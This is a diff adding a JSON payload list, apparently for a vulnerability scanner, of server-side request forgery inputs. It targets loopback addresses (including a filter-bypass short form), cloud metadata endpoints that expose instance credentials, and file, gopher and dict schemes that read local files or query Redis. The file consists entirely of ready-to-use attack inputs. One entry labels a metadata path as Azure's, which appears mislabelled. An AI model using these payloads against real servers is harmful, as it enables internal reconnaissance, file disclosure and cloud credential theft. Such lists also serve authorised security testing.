@@ -1,0 +1,23 @@
+{
+  "family": "ssrf",
+  "version": "1.0.0",
+  "categories": {
+    "loopback": [
+      {"payload": "http://127.0.0.1",          "description": "IPv4 loopback", "confidence_hint": 95},
+      {"payload": "http://localhost",          "description": "DNS loopback", "confidence_hint": 90},
+      {"payload": "http://[::1]",              "description": "IPv6 loopback", "confidence_hint": 85},
+      {"payload": "http://127.1",              "description": "Short IPv4", "confidence_hint": 80, "description_extra": "Bypass simple filter"}
+    ],
+    "metadata": [
+      {"payload": "http://169.254.169.254/latest/meta-data/",    "description": "AWS metadata", "confidence_hint": 95},
+      {"payload": "http://metadata.google.internal/",            "description": "GCP metadata", "confidence_hint": 95},
+      {"payload": "http://169.254.169.254/metadata/v1/",         "description": "Azure metadata", "confidence_hint": 90}
+    ],
+    "schemes": [
+      {"payload": "file:///etc/hostname",  "description": "File scheme (Linux)", "confidence_hint": 90},
+      {"payload": "file:///c:/windows/win.ini", "description": "File scheme (Windows)", "confidence_hint": 90},
+      {"payload": "gopher://127.0.0.1:25/", "description": "Gopher exotic", "confidence_hint": 70},
+      {"payload": "dict://127.0.0.1:6379/info", "description": "Redis info via dict", "confidence_hint": 85}
+    ]
+  }
+}
